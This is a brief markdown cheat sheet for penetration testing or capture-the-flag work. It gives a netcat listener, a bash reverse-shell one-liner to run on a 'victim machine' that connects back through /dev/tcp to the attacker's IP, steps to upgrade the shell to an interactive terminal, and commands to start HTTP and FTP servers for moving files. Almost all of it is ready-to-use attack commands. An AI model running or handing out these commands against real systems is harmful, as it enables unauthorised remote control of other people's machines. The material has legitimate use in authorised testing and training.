# Reverse Shell Cheatsheet

## Spawning a shell
### Creating stable shell
On your local machine
```console
~$ sudo nc -lvnp 9001
```
On victim machine
```console
~$ bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"
```

### Making shell interactive
```bash
~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
~$ stty raw -echo; fg
~$ export TERM=xterm
```

## Making Servers
### HTTP
```bash
~$ sudo python3 -m http.server {PORT-NUMBER}
```
### FTP
```bash
~$ sudo python3 -m pyftpdblib -p 21 -w
```



